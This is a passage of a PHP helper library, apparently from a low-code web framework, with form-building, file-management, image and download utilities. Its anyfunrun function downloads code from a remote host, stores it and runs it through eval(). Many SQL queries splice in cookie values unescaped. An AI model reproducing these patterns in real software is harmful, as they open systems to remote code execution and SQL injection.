         $tmplabel=qian($casehtml,"</label>")."</label>";
       };
        $pdx=round((anyvalue($strst,"SQX",$i)*1-anyvalue($strst,"SQX",($i-1))*1)*10);              
        if ($pdx*1==1){        
          $tklei=$tklei.str_replace("[inline]",str_replace("class","ocls",hou($casehtml,"/label>")),$casecode["inline"]);       
        }else{
          $tklei=$tklei.$tmplabel.str_replace("[inline]",str_replace("class","style=\"margin-left:30px;width:80%;\" ocls",hou($casehtml,"/label>")),$casecode["inline"]);                 
        }
       $tmplabel="";
         $rowx=str_replace("[rowx]",$tklei,$casecode["row"]);         
        //套上本行累计者外套，准备结束
         $alllei=$alllei.$rowx;
         $rowx="";      
      }else{ //右侧既没有等的，本次也不在累计中
        //左右逗弄  或支农这一个 直接加框
       //echo "左右都直接单独者套外套".$i."".$cdkx."<br>-----";
         $rowx=str_replace("[rowx]",$casehtml,$casecode["row"]);      
         $alllei=$alllei.$rowx;
         $rowx="";
      }//tk
      $tk=0;
      $tklei="";
    };  //if发现后边有相等的 
    if ($xy==(intval(anyvalue($strst,"SQX",$i)*1))){//发现后边有相等的
      $tk=$tk+1;
    }
  }else{//最后一个就这样给忽略了
         $rowx=str_replace("[rowx]",$casehtml,$casecode["row"]);      
         $alllei=$alllei.$rowx;
         $rowx="";
  };//if

};//for

//echo $casecode["srd"];


$fmhtml=str_replace("[srdinner]",$alllei,$casecode["srd"]).$allscp;
$fmhtml=str_replace("[sttitle]",$sttitle,$fmhtml);
$fmhtml=str_replace("ocls=\"demo-input\"","class=\"demo-input\"",$fmhtml);//特殊为input 专门更改，特例，不是普遍算法
$fmhtml=str_replace("ocls=\"layui-input\"","class=\"layui-input\"",$fmhtml);//特殊为input 专门更改，特例，不是普遍算法
return $fmhtml;
}
function anyunion($ustr){
  $fmhx="";
  $ptu=explode(",",$ustr);
  $totp=count($ptu);
  //stid@key:val,stid@SNO=12/stlx
  for ($j=0;$j<$totp;$j++){
    $stid=qian($ptu[$j],"@");
    $uxy=hou($ptu[$j],"@");
    if (strpos($uxy,":")>0){
      $kx=qian($uxy,":");
      $vx=hou($uxy,":");
      $fmhx=$fmhx.anyshort($stid,"1:".$kx,"50:".$vx);
    }else{
      $stlx=hou($uxy,"/");
      $mkx=qian(hou($uxy,"="),"/");
      if (strpos(".".$uxy,"SNO")>0){
        $sno=$mkx;
        $omk="";
      }else{
        $sno="";
        $omk=$mkx;
      }
      //echo $stid."--".$stlx."--".$sno."--".$omk;
      $fmhx=$fmhx.astn($stid,$stlx,$sno,$omk,"");
    }//uxy
    
  }//for
  return $fmhx;
}//fun
function newprocess($accid,$tbnm,$tbmk){
  eval(CLASSX("eventprocess"));
  $np=new eventprocess();
  return $np->newprocess($accid,$tbnm,$tbmk);
}
function getuserbyrp($rps,$crtor){
  $conn=mysql_connect(gl(),glu(),glp());
  switch ($crtor){
    case "[director]":
     $bku=updatingx($conn,glb(),"select authorize as result from coode_userlist where userid='".$crtor."'","utf8");
    break;
    case "[medio]":
      $bku=updatingx($conn,glb(),"select userid as result from coode_userlist where userid='".$_COOKIE["uid"]."' and depart='medio'","utf8");
    break;
    case "[polar]":
      $bku=updatingx($conn,glb(),"select userid as result from coode_userlist where userid='".$_COOKIE["uid"]."' and depart='polars'","utf8");
    break;
    default:
      $bku=updatingx($conn,glb(),"select userid as result from coode_userlist where userid='".$_COOKIE["uid"]."' and concat('[',depart,']')='".$rps."'","utf8");
  }
  if ($bku==""){
    $bku="3.141592653";
  }
  return $bku;
}
function recfunrun($fid,$appid,$gkey,$pkey,$rstr,$rtnval){
  $sqla="appid,fromurl,fromip,preurl,CDMK,etel,code,asktime,accesstime,fid,qryx,formy,AUTHOR,CRTM,UPTM,CRTOR,OLMK,RIP,rtnval";
  $sqlb="'".$appid."','".$_SERVER['HTTP_REFERER']."','".getip()."','".$_SERVER['PHP_SELF']."','','"._cookie("uid")."','".$rstr."',now(),now(),'".$fid."','".$gkey."','".$pkey."','',now(),now(),'".$_COOKIE["uid"]."','".onlymark()."','".getip()."','".$rtnval."'";
  if ($rstr=="success"){
    $x=UX("insert into coode_afrunfun(".$sqla.",STATUS)values(".$sqlb.",1)");
  }else{
    $x=UX("insert into coode_afrunfun(".$sqla.")values(".$sqlb.")");
  }
  return 1;
}
function anyfunrun($fid,$appid,$gkey,$pkey){
  $funvalue="";
  $fid=str_replace("()","",$fid);
  $_GET["afrunstr"]=_get("afrunstr");//方式为空出错
  $fmd5="a".md5($fid.$appid.$gkey.$pkey);
  
 if (strpos("xxx".$_GET["afrunstr"],$fid.$appid.$gkey.$pkey)>0){//防止死循环
  if ($_SESSION[$fmd5]!=""){
      return  $_SESSION[$fmd5];
  }else{
      $r=recfunrun($fid,$appid,$gkey,$pkey,"NoPermissionFor-TooManyRepeat:".$_COOKIE["cid"]."-".$_COOKIE["gid"]."-".$_COOKIE["uid"],'');//直接返回缓存
     // return "NoPermissionFor-TooManyRepeat(".$fid."):".$_COOKIE["cid"]."-".$_COOKIE["gid"]."-".$_COOKIE["uid"];    
      return "";
  }
 }else{
  if ($gkey==""){
    //空值
  }else{
    if (strpos($gkey,"&")>0){
      $ptgk=explode("&",$gkey);
      $totpt=count($ptgk);
      for ($xy=0;$xy<$totpt;$xy++){
        if (strpos($ptgk[$xy],"=")>0){
          $_GET[qian($ptgk[$xy],"=")]=hou($ptgk[$xy],"=");
          if ($_GET[qian($ptgk[$xy],"=")]==""){
            $_GET[qian($ptgk[$xy],"=")]=_get(qian($ptgk[$xy],"="));           
          }
        }else{
          //局部未发现 有可能直接放在GET里了
        }      
      }//       
    }else{
      if (strpos($gkey,"=")>0){
         $_GET[qian($gkey,"=")]=hou($gkey,"=");
         if ($_GET[qian($gkey,"=")]==""){           
           $_GET[qian($gkey,"=")]=_get(qian($gkey,"="));
         }
      }else{
        //未发现GET
      }
    }
  }  
 
  if ($pkey==""){
    //空值
  }else{
    if (strpos($pkey,"&")>0){
      $ptpk=explode("&",$pkey);
      $totpt=count($ptpk);
      for ($xy=0;$xy<$totpt;$xy++){
        if (strpos($ptpk[$xy],"=")>0){
           $_POST[qian($ptpk[$xy],"=")]=hou($ptpk[$xy],"=");
          if ($_POST[qian($ptpk[$xy],"=")]==""){
            $_POST[qian($ptpk[$xy],"=")]=_post(qian($ptpk[$xy],"="));            
          }
        }else{
          //局部未发现
        }      
      }//       
    }else{
      if (strpos($pkey,"=")>0){
        $_POST[qian($pkey,"=")]=hou($pkey,"=");        
        if ($_POST[qian($pkey,"=")]==""){
          $_POST[qian($pkey,"=")]=_post(qian($pkey,"="));  
        }
      }else{
        //未发现POST
      }
    }
  }
   if ($_GET["afrunstr"]==""){
     $_GET["afrunstr"]=$fid.$appid.$gkey.$pkey;
   }else{
     $_GET["afrunstr"]=$_GET["afrunstr"]."/".$fid.$appid.$gkey.$pkey;
   }

  
  $frst=SX("select ispmiss,vermd5,funfull,oldfull,funcname  from coode_funlist where funname='".$fid."' or funname='".$fid."()' or  funname='".str_replace("()","",$fid)."'");
  $totfun=countresult($frst);
  $isp=anyvalue($frst,"ispmiss",0);
  $vmd5=anyvalue($frst,"vermd5",0);
  $funname=anyvalue($frst,"funcname",0);
  $funfull=anyvalue($frst,"funfull",0);
  $oldfull=anyvalue($frst,"oldfull",0);
 if ($fid!="" and (haspmtoffun(str_replace("()","",$fid),$_COOKIE["uid"],$_COOKIE["cid"]) or $isp*1==0) and getip()!=""){
   //---------------------------------
    $fn=$fid;
   if (isx2($fn,"SNO:","@")){
     $skey=hou($fn,".");
     $sno=qian(hou($fn,"SNO:"),".");
     $tbnm=qian($fn,"@");
     $funfull=UX("select ".$skey." as result from ".$tbnm."  where SNO='".$sno."' ");        
   }else{
     if (isx1($fn,"@") and !isx1($fn,"SNO:")){
      $ckey=hou($fn,".");
      $tbnm=qian(hou($fn,"@"),".");
      $skey=qian($fn,"@");
      $funfull=UX("select ".$skey." as result from coode_keydetailx where TABLE_NAME='".$tbnm."'  and COLUMN_NAME='".$ckey."' ");
      $conn=mysql_connect(gl(),glu(),glp());
      $tbname=updatings($conn,glb(),"select tabtitle as result from coode_tablist where TABLE_NAME='".$tbnm."' ","utf8");
     }else{
       
       if (intval($totfun)>0 and $funfull!=""){
        
       }else{
        if (glm()!="[motherhost]"){ 
         $funname="";
         $funfull=file_get_contents("http://".glm()."/DNA/EXF/anyfuns.php?fid=getmotherfun&regcode=".glr()."&funid=".str_replace("()","",$fid));
         $oldfull=$funfull;        
		 if (intval($totfun)==0){
          $x=UX("insert into coode_funlist(funname,CRTM,UPTM,OLMK,lang,funfull,oldfull,lastfull,CRTOR)values('".str_replace("()","",$fid)."()',now(),now(),'".onlymark()."','php','".$funfull."','".$oldfull."','".$oldfull."','coode')");
		 }else{
		  $x=UX("update coode_funlist set funfull='".$funfull."',oldfull='".$funfull."',lastfull='".$funfull."' where funname='".$fn."' or funname='".$fn."()'");
		 }
        };
       };
     };
   };//--------------------------------   
   if ($funfull!="" and $funfull!="NO-PERMISSIONS"){     
     $ffull=tostring($funfull);
     $ofull=tostring($oldfull);
     if (strpos($ffull,'funvalue=')>0){
       $ffull=str_replace('echo','//echo',$ffull);
     }else{
       $ffull=str_replace('echo','$funvalue=$funvalue.',$ffull);
     }
     if (strpos($ofull,'funvalue=')>0){
       $ofull=str_replace('echo','//echo',$ofull);
     }else{
       $ofull=str_replace('echo','$funvalue=$funvalue.',$ofull);
     }
     $conn=mysql_connect(gl(),glu(),glp());
     $isx=updtaings($fid,md5($ffull),"update coode_funfull set UPTM=now() where funname='".$fid."' or funname='".$fid."()' or  funname='".str_replace("()","",$fid)."'",strlen($ffull));//jiahanshu     
     if ($ofull==$ffull or $_GET["testfun"]=="1"){
      eval($ffull);
     }else{
      eval($ofull);
     }
     $r=recfunrun($fid,$appid,$gkey,$pkey,"success",$funvalue);
      $_SESSION[$fmd5]=$funvalue;
      return $funvalue;
   }else{//fid  zzz
     if (isen($fid)){
       $conn=mysql_connect(gl(),glu(),glp());     
       $x=updatingx($conn,glb(),"insert into coode_funlist(funname,CRTM,UPTM,OLMK,lang)values('".str_replace("()","",$fid)."()',now(),now(),'".$olmk."','php')","utf8");
     }
      $r=recfunrun($fid,$appid,$gkey,$pkey,"NoSuchFunctionFor:".$_COOKIE["cid"]."-".$_COOKIE["gid"]."-".$_COOKIE["uid"],'');
      return "NoSuchFunctionFor:".$_COOKIE["cid"]."-".$_COOKIE["gid"]."-".$_COOKIE["uid"].getip();
    };   
  }else{
        $r=recfunrun($fid,$appid,$gkey,$pkey,"NoPermissionFor:".$_COOKIE["cid"]."-".$_COOKIE["gid"]."-".$_COOKIE["uid"].getip(),'');
     return "NoPermissionFor:".$_COOKIE["cid"]."-".$_COOKIE["gid"]."-".$_COOKIE["uid"].getip();
  };//if fid  
   
 }
}
function anyunit($unitstr,$dttp){
  //coode_tiny@sysid.SNO
  if (strpos($unitstr,"@")>0 and strpos($unitstr,".")>0){
    $tbnm=qian($unitstr,"@");
    $tbk=qian(hou($unitstr,"@"),".");
    $tbsno=hou($unitstr,".");
    switch($dttp){
      case "text":
        return atv("(".$tbnm."@SNO=".$tbsno.").".$tbk);
      break;
      case "json":
        return "{\"unitstr\":\"".$unitstr."\",\"value\":\"".atv("(".$tbnm."@SNO=".$tbsno.").".$tbk)."\"}";
      break;
      case "html":
      return "";
      break;
    }
  }else{
    return "";
  }
  
}
function getcomuser($expstr,$itemuser,$itemcid){
  eval(CLASSX("comuser"));
  $guser=new comuser();
  return $guser->getcomuser($expstr,$itemuser,$itemcid);
}
function plusmins($pma,$pmb,$ysf){
  $ptpmb=explode(",",$pmb);
  $totpt=countresult($ptpmb);
  $tmpx=$pma;
  for ($i=0;$i<$totpt;$i++){
   if ($ysf=="+"){
     if (strpos(",".$tmpx.",",$ptpmb[$i])>0){       
     }else{
       $tmpx=$tmpx.$ptpmb[$i].",";
     }
   }else{
     if (strpos(",".$tmpx.",",$ptpmb[$i])>0){       
     }else{
       $tmpx=str_replace($ptpmb[$i].",","",$tmpx);
     }     
   }//ifysf
  }//fori
  return $tmpx;
}//func
function onlyone($strx){
  $ptstr=explode(",",$strx);
  $totpt=count($ptstr);
  $tmpx="";
  for ($i=0;$i<$totpt;$i++){
    if ($ptstr[$i]!=""){
     if (strpos(",".$tmpx.",",$ptstr[$i])>0){
     }else{
      if ( $ptstr[$i]!=""){
       $tmpx=$tmpx.$ptstr[$i].",";
      };
     }
    }
  }//fori
  return $tmpx;
}//func
function appfile($fnm,$ftxt){
$myfile = fopen($fnm, "w") or die("Unable to open file!");
 $txt = $ftxt;
 fwrite($myfile, $txt);
 fclose($myfile);
 return 1;
}
function overfile($fnm,$ftxt){
  $lsx=explode("/",$fnm);
  $totls=count($lsx);
  $frt=str_replace($lsx[$totls-1],"",$fnm);
  $cx=createdir($frt);
 $myfile = fopen($fnm, "w") or die("Unable to open file!");
 $txt = $ftxt;
 fwrite($myfile, $txt);
 fclose($myfile);
 return 1;
}
function getFile($url, $save_dir = '', $filename = '', $type = 0) {  
    if (trim($url) == '') {  
        return false;  
    }  
    if (trim($save_dir) == '') {  
        $save_dir = './';  
    }  
    if (0 !== strrpos($save_dir, '/')) {  
        $save_dir.= '/';  
    }  
    //创建保存目录  
    if (!file_exists($save_dir) && !mkdir($save_dir, 0777, true)) {  
        return false;  
    }  
    //获取远程文件所采用的方法  
    if ($type) {  
        $ch = curl_init();  
        $timeout = 5;  
        curl_setopt($ch, CURLOPT_URL, $url);  
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  
        $content = curl_exec($ch);  
        curl_close($ch);  
    } else {  
        ob_start();  
        readfile($url);  
        $content = ob_get_contents();  
        ob_end_clean();  
    }  
    //echo $content;  
    $size = strlen($content);  
    //文件大小  
    $fp2 = @fopen($save_dir . $filename, 'a');  
    fwrite($fp2, $content);  
    fclose($fp2);  
    unset($content, $url);  
    return array(  
        'file_name' => $filename,  
        'save_path' => $save_dir . $filename,  
        'file_size' => $size  
    );  
}
function getfltxt($fnm){
 if ($fnm!=""){
   $myfile = fopen($fnm, "r") or die("Unable to open file!");
//   $ftext=fgets($myfile); 
   $ftext = file_get_contents($fnm);  
   $text=$ftext;
                        define('UTF32_BIG_ENDIAN_BOM', chr(0x00) . chr(0x00) . chr(0xFE) . chr(0xFF));  
                        define('UTF32_LITTLE_ENDIAN_BOM', chr(0xFF) . chr(0xFE) . chr(0x00) . chr(0x00));  
                        define('UTF16_BIG_ENDIAN_BOM', chr(0xFE) . chr(0xFF));  
                        define('UTF16_LITTLE_ENDIAN_BOM', chr(0xFF) . chr(0xFE));  
                        define('UTF8_BOM', chr(0xEF) . chr(0xBB) . chr(0xBF));  
                        $first2 = substr($text, 0, 2);  
                        $first3 = substr($text, 0, 3);  
                        $first4 = substr($text, 0, 3);  
                        $encodType = "";  
                        if ($first3 == UTF8_BOM)  
                            $encodType = 'UTF-8 BOM';  
                        else if ($first4 == UTF32_BIG_ENDIAN_BOM)  
                            $encodType = 'UTF-32BE';  
                        else if ($first4 == UTF32_LITTLE_ENDIAN_BOM)  
                            $encodType = 'UTF-32LE';  
                        else if ($first2 == UTF16_BIG_ENDIAN_BOM)  
                            $encodType = 'UTF-16BE';  
                        else if ($first2 == UTF16_LITTLE_ENDIAN_BOM)  
                            $encodType = 'UTF-16LE';  
  
                        //下面的判断主要还是判断ANSI编码的·  
                        if ($encodType == '') {//即默认创建的txt文本-ANSI编码的  
                            $content = iconv("GBK", "UTF-8", $text);  
                        } else if ($encodType == 'UTF-8 BOM') {//本来就是UTF-8不用转换  
                            $content = $text;  
                        } else {//其他的格式都转化为UTF-8就可以了  
                            $content = iconv($encodType, "UTF-8", $text);  
                        }  


   fclose($myfile);
   return $content;
  }else{
  return "";
  }
}
function get_file_list($fpath){
 $file_list = array();
 $file_path = $fpath;
if (is_dir($file_path)){
   $handler = opendir($file_path);
    while(($filename = readdir($handler))!== false ) {
    if($filename != "." && $filename != ".."){
     $file_list[] = $filename;
     };
    };
   closedir($handler);
   return $file_list;
 };
}
  function compressed_image($imgsrc,$yx=0,$yy=0,$mbx=0,$mby=0,$nw,$nh,$yw,$yh,$qlt=0.9){//该函数直接生成图像
    if ($yw==0 and $yh==0){
      list($width,$height,$type)=getimagesize($imgsrc);
    }else{
      list($width,$height,$type)=getimagesize($imgsrc);
       $width=$yw;
       $height=$yh;
    }
    $new_width =$nw;          //($width>600?600:$width)*0.9;
    $new_height =$nh;         // ($height>600?600:$height)*0.9;
    switch($type){
      case 1:
        $giftype=check_gifcartoon($imgsrc);
        if($giftype){
          header('Content-Type:image/gif');
          $image_wp=imagecreatetruecolor($new_width, $new_height);
          $image = imagecreatefromgif($imgsrc);
          //imagecopyresampled — 重采样拷贝部分图像并调整大小
          //dst_image 目标图象连接资源。src_image源图象连接资源。dst_x目标 X 坐标点。dst_y目标 Y 坐标点。src_x源的 X 坐标点。src_y源的 Y 坐标点。dst_w目标宽度。dst_h目标高度。src_w源图象的宽度。src_h源图象的高度。
         imagecopyresampled($image_wp, $image, $mbx, $mby, $yx, $yy, $new_width, $new_height, $width, $height);
          //75代表的是质量、压缩图片容量大小
          imagegif($image_wp, $imgdst);//直接画出图像
          imagedestroy($image_wp);
          return true;
        }
        break;
      case 2:
        header('Content-Type:image/jpeg');
        $image_wp=imagecreatetruecolor($new_width, $new_height);
        $image = imagecreatefromjpeg($imgsrc);
        imagecopyresampled($image_wp, $image, $mbx, $mby, $yx, $yy, $new_width, $new_height, $width, $height);
        //75代表的是质量、压缩图片容量大小
        imagejpeg($image_wp, $imgdst,$qlt);
        imagedestroy($image_wp);
        return true;
        break;
      case 3:
        header('Content-Type:image/png');
        $image_wp=imagecreatetruecolor($new_width, $new_height);
        $image = imagecreatefrompng($imgsrc);
        imagecopyresampled($image_wp, $image, $mbx, $mby, $yx, $yy, $new_width, $new_height, $width, $height);
        //75代表的是质量、压缩图片容量大小
        imagepng($image_wp, $imgdst);
        imagedestroy($image_wp);
          return true;
        break;
    }
  }
function combpic($bigImgPath,$qCodePath,$startx,$starty,$newfile){

$bigImg = imagecreatefromstring(file_get_contents($bigImgPath));
$qCodeImg = imagecreatefromstring(file_get_contents($qCodePath));
list($qCodeWidth, $qCodeHight, $qCodeType) = getimagesize($qCodePath);
imagecopymerge($bigImg, $qCodeImg, $startx, $starty, 0, 0, $qCodeWidth, $qCodeHight, 100);
list($bigWidth, $bigHight, $bigType) = getimagesize($bigImgPath);
imagejpeg($bigImg,$newfile);
return 1;
}
function extendpic($qCodePath,$bfb,$id){

 $qCodeImg = imagecreatefromstring(file_get_contents($qCodePath));
 list($qCodeWidth, $qCodeHight, $qCodeType) = getimagesize($qCodePath);
 $jx=createjuxing($qCodeWidth*$bfb,$qCodeHight*$bfb);
 $bigImg=$jx;
 imagecopymerge($bigImg, $qCodeImg, $qCodeWidth*($bfb-1)*0.5, $qCodeHight*($bfb-1)*0.5, 0, 0, $qCodeWidth, $qCodeHight, 100);
 imagejpeg($bigImg,'img/'.$id.hou($qCodePath,"."));
return 1;
}
function createjuxing($jw,$jh){
$im = imagecreatetruecolor($jw,$jh);
//新建一个真彩色图像，默认背景是黑色，返回图像标识符。另外还有一个函数 imagecreate 已经不推荐使用。
//2、绘制所需要的图像
$white = imagecolorallocate($im,255,255,255);//创建一个颜色，以供使用
imagerectangle($im,0,0,$jw,$jh,$white);//画一个矩形。参数说明：30,30表示矩形左上角坐标；240,140表示矩形右下角坐标；$red表示颜色
imagefilledrectangle($im,2,2,$jw-2,$jh-2,$white);//填充的矩形
//3、输出图像
//header("content-type: image/png");
//imagepng($im);//输出到页面。如果有第二个参数[,$filename],则表示保存图像
//4、销毁图像，释放内存
return $im;
//imagedestroy($im);

}


 function appendf($fnm,$ftxt){
   $x=file_put_contents($fnm,$ftxt,FILE_APPEND);
   return 1;
 }
function dir_exist_file($path) {
    if(!is_dir($path)) {
        return false;
    } else {
        $files = scandir($path);
        unset($files[0]);
        unset($files[1]);
        if(!empty($files[2])) {
            return true;
        }else{
            return false;
        }
    }
}
function createdir($path){
if (is_dir($path)){
  return "0";
}else{
 //第三个参数是“true”表示能创建多级目录，iconv防止中文目录乱码
 $res=mkdir($path,0777,true);
 if ($res){
  return 1;
 }else{
  return -1;
 }
}

} 



function getImage($url,$save_dir='',$filename='',$type=0){
  if(trim($url)==''){
 return array('file_name'=>'','save_path'=>'','error'=>1);
 }
 if(trim($save_dir)==''){
 $save_dir='./';
 }
  if(trim($filename)==''){//保存文件名
    $ext=strrchr($url,'.');
    if($ext!='.gif'&&$ext!='.jpg'){
  return array('file_name'=>'','save_path'=>'','error'=>3);
 }
    $filename=time().$ext;
  }
 if(0!==strrpos($save_dir,'/')){
 $save_dir.='/';
 }
 //创建保存目录
 if(!file_exists($save_dir)&&!mkdir($save_dir,0777,true)){
 return array('file_name'=>'','save_path'=>'','error'=>5);
 }
  //获取远程文件所采用的方法
  if($type){
 $ch=curl_init();
 $timeout=5;
 curl_setopt($ch,CURLOPT_URL,$url);
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
 $img=curl_exec($ch);
 curl_close($ch);
  }else{
   ob_start();
   readfile($url);
   $img=ob_get_contents();
   ob_end_clean();
  }
  //$size=strlen($img);
  //文件大小
  $fp2=@fopen($save_dir.$filename,'a');
  fwrite($fp2,$img);
  fclose($fp2);
 unset($img,$url);
  return array('file_name'=>$filename,'save_path'=>$save_dir.$filename,'error'=>0);
}


function GrabImage($url, $filename = "") {
 if ($url == ""):return false;
 endif;
 //如果$url地址为空，直接退出
 if ($filename == "") {
 //如果没有指定新的文件名
  $ext = strrchr($url, ".");
  //得到$url的图片格式
  if ($ext != ".gif" && $ext != ".jpg"  && $ext != ".png"):return false;
  endif;
  //如果图片格式不为.gif或者.jpg，直接退出
  $filename = date("dMYHis") . $ext;
  //用天月面时分秒来命名新的文件名
 }else{ 
   $lcpath=urltopath($filename);
   is_dir($lcpath) OR mkdir($lcpath, 0777, true); 
 }
 ob_start();//打开输出
 readfile($url);//输出图片文件
 $img = ob_get_contents();//得到浏览器输出
 ob_end_clean();//清除输出并关闭
 $size = strlen($img);//得到图片大小 
 $fp2 = @fopen($filename, "a");
 fwrite($fp2, $img);//向当前目录写入图片文件，并重新命名
 fclose($fp2);
 return $filename;//返回新的文件名
}


function delFileUnderDir( $dirName ){ //只删除目录里的文件，里面的目录不算
 if ( $handle = opendir( "$dirName" ) ) { 
   while ( false !== ( $item = readdir( $handle ) ) ) { 
      if ( $item != "." && $item != ".." ) { 
          if ( is_dir( "$dirName/$item" ) ) { 
           delFileUnderDir( "$dirName/$item" ); 
           } else {          
              if( unlink( "$dirName/$item" ) ){
                $rtnstr=$rtnstr. "成功删除文件： $dirName/$item<br />"; 
               }
           } 
       } 
    } 
  closedir( $handle ); 
 } 
  return $rtnstr;
} 
function delallUnderDir( $dirName ){ //删除目录里 的 文件和目录
  $rtnstr="";
 if ( $handle = opendir( "$dirName" ) ) { 
   while ( false !== ( $item = readdir( $handle ) ) ) { 
      if ( $item != "." && $item != ".." ) { 
          if ( is_dir( "$dirName/$item" ) ) { 
             $rtnstr=$rtnstr.deltree( "$dirName/$item" ); 
           } else {          
              if( unlink( "$dirName/$item" ) ){
                $rtnstr=$rtnstr."成功删除文件： $dirName/$item<br />"; 
               }
           } 
       } 
    } 
  closedir( $handle ); 
 } 
  return $rtnstr;
} 
//假设需要删除一个名叫”upload”目录下的所有文件,但无需删除目录文件夹,你可以通过以下代码完成:


function deltree($pathdir) { 
// echo $pathdir;//调试时用的 
  $rtnstr="";
  if(is_empty_dir($pathdir)){ 
    rmdir($pathdir);//直接删除 
    $rtnstr=$rtnstr."成功删除目录".$pathdir."<br />";
   }else{//否则读这个目录，除了.和..外 
     $d=dir($pathdir); 
    while($a=$d->read()) { 
      if(is_file($pathdir.'/'.$a) && ($a!='.') && ($a!='..')){
         unlink($pathdir.'/'.$a);
        $rtnstr=$rtnstr."成功删除文件".$pathdir."/".$a."<br />";
       }  //如果是文件就直接删除 
      if(is_dir($pathdir.'/'.$a) && ($a!='.') && ($a!='..')) {//如果是目录 
          if(!is_empty_dir($pathdir.'/'.$a)) {//是否为空
            //如果不是，调用自身，不过是原来的路径+他下级的目录名 
            $rtnstr=$rtnstr.deltree($pathdir.'/'.$a); 
           } 
           if(is_empty_dir($pathdir.'/'.$a)) {//如果是空就直接删除 
             rmdir($pathdir.'/'.$a); 
             $rtnstr=$rtnstr."成功删除目录".$pathdir."/".$a."<br />";
            } 
       } 
     }//while 
    $d->close(); 
  // echo "必须先删除目录下的所有文件";//我调试时用的 
  } //empty
  return $rtnstr;
} 
function is_empty_dir($pathdir) { 
   //判断目录是否为空 
   $d=opendir($pathdir); 
   $i=0; 
   while($a=readdir($d)) { 
      $i++; 
    } 
    closedir($d); 
   if($i>2){
      return false;
   } else {
     return true; 
   }
}
function delDirAndFile( $dirName ) { 
  if ( $handle = opendir("$dirName") ) { 
    while ( false !== ( $item = readdir($handle))) { 
       if ( $item != "." && $item != ".." ) { 
           if ( is_dir( "$dirName/$item" ) ) { 
             delDirAndFile( "$dirName/$item" ); 
           } else { 
             if( unlink( "$dirName/$item" ) ){
               //echo "成功删除文件： $dirName/$item<br />n"; 
           } 
        } 
    } 
    closedir( $handle ); 
   if( rmdir( $dirName ) ){
    // echo "成功删除目录： $dirName<br />n"; 
   }
  } 
 }
}
  //假设需要删除一个名叫upload的同级目录即此目录下的所有文件，你可以通过以下代码完成： 
//delDirAndFile('upload'); 
 function pmeonly($pmestr){
   $stp=2;
   while (strpos("---,".$pmestr.",",",".strval($stp).",")>0){
      $stp=$stp+1;
       while (pmenum($stp)==false){
         $stp=$stp+1;
       }
   }
   return $stp;
 }
function dir_mkdir($path = '', $mode = 0777, $recursive = true)
{
    clearstatcache();
    if (!is_dir($path))
    {
        mkdir($path, $mode, $recursive);
        return chmod($path, $mode);
    }
 
    return true;
}
function copy_dir($src = '', $dst = '')
{
    if (empty($src) || empty($dst))
    {
        return false;
    }
    $dir = opendir($src);
    dir_mkdir($dst);
    while (false !== ($file = readdir($dir)))
    {
        if (($file != '.') && ($file != '..'))
        {
            if (is_dir($src . '/' . $file))
            {
                copy_dir($src . '/' . $file, $dst . '/' . $file);
            }
            else
            {
                copy($src . '/' . $file, $dst . '/' . $file);
            }
        }
    }
    closedir($dir);
    return true;
}
function copy_filetodir($from_file,$to_dir){//只复制目录里文件内容到另一个目录
   if (substr($to_dir,-1)=="/"){
     $to_dir=killlaststr($to_dir);
   }
     if (!is_file($from_file)){
        return false;
    }    
    $ptfrom=explode("/",$from_file);
    $totpt=count($ptfrom);
    $lstpt=$ptfrom[$totpt-1];              
    is_dir($to_dir) OR mkdir($to_dir, 0777, true);     
    copy($from_file,$to_dir."/".$lstpt);    
   return true;
 }
function move_filetodir($from_file,$to_dir){//只复制目录里文件内容到另一个目录
    if (substr($to_dir,-1)=="/"){
     $to_dir=killlaststr($to_dir);
    } 
    if (!is_file($from_file)){
        return false;
    }    
    $ptfrom=explode("/",$from_file);
    $totpt=count($ptfrom);
    $lstpt=$ptfrom[$totpt-1];        
    if (!file_exists($to_dir)){        
      is_dir($to_dir) OR mkdir($to_dir, 0777, true); 
    }
    copy($from_file,$to_dir."/".$lstpt);    
   unlink($from_file);
   return true;
 }
function copy_underdir($from_dir,$to_dir){//只复制目录里文件内容到另一个目录
    if (substr($to_dir,-1)=="/"){
      $to_dir=killlaststr($to_dir);
    }
     if (!is_dir($from_dir)){
        return false;
    }    
    $from_files = scandir($from_dir);    
    if (!file_exists($to_dir)){        
      is_dir($to_dir) OR mkdir($to_dir, 0777, true); 
    }
    if (!empty($from_files)){
        foreach ($from_files as $file){
            if ($file == '.' || $file == '..' ){
                continue;
            }              
            if (is_dir($from_dir.'/'.$file)){//如果是目录，则调用自身
                copy_dir($from_dir.'/'.$file,$to_dir.'/'.$file);
            }else{//直接copy到目标文件夹
                copy($from_dir.'/'.$file,$to_dir.'/'.$file);
            }
        }
    }
   return true;
 }
 function move_underdir($from_dir,$to_dir){//只复制目录里文件内容到另一个目录
     if (substr($to_dir,-1)=="/"){
       $to_dir=killlaststr($to_dir);
     }
     if (!is_dir($from_dir)){
        return false;
    }    
    $from_files = scandir($from_dir);    
    if (!file_exists($to_dir)){        
      is_dir($to_dir) OR mkdir($to_dir, 0777, true); 
    }
    if (!empty($from_files)){
        foreach ($from_files as $file){
            if ($file == '.' || $file == '..' ){
                continue;
            }              
            if (is_dir($from_dir.'/'.$file)){//如果是目录，则调用自身
                copy_dir($from_dir.'/'.$file,$to_dir.'/'.$file);
            }else{//直接copy到目标文件夹
                copy($from_dir.'/'.$file,$to_dir.'/'.$file);
            }
        }
    }
   $z=delallUnderDir($from_dir);
   return true;
 }
   
function copyme_dir($from_dir,$to_dir){//复制目录本身及文件
    if (substr($to_dir,-1)=="/"){
      $to_dir=killlaststr($to_dir);
    }
    if (!is_dir($from_dir)){
        return false;
    }    
    $ptfrom=explode("/",$from_dir);
    $totpt=count($ptfrom);
    $lstpt=$ptfrom[$totpt-1];
    $to_dir=$to_dir."/".$lstpt;
    $from_files = scandir($from_dir);    
    if (!file_exists($to_dir)){        
      is_dir($to_dir) OR mkdir($to_dir, 0777, true); 
    }
    if (!empty($from_files)){
        foreach ($from_files as $file){
            if ($file == '.' || $file == '..' ){
                continue;
            }              
            if (is_dir($from_dir.'/'.$file)){//如果是目录，则调用自身
                copy_dir($from_dir.'/'.$file,$to_dir.'/'.$file);
            }else{//直接copy到目标文件夹
                copy($from_dir.'/'.$file,$to_dir.'/'.$file);
            }
        }
    }
  return true;
 }

